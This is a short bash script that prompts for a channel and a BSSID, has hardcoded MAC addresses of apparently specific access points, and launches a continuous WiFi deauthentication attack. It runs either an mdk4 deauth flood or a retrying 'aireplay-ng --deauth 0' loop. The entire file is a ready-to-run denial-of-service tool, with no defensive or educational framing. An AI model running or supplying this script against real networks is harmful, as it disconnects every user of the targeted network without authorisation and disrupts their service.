#!/bin/bash

echo "CHANNEL"
read ch
echo "BSSID"
read b
echo "1:MDK4 2:AIREPLAY"
read c


if [ "$b" = "1" ]; then
	b="80:03:84:a7:b0:c0"
elif [ "$b" = "2" ]; then
	b="80:03:84:a7:80:00"
elif [ "$b" = "sc" ]; then
	b="80:03:84:a7:83:90"
fi




if [ "$c" = "1" ]; then
	iw dev wlan0 set channel $ch
	mdk4 wlan0 d -B "$b"
elif [ "$c" = "2" ]; then
	while true; do
		aireplay-ng --deauth 0 -a "$b" wlan0
		if [ $? -ne 0 ]; then
			sleep 1
		else
			break
		fi
	done
else
	exit 1
fi

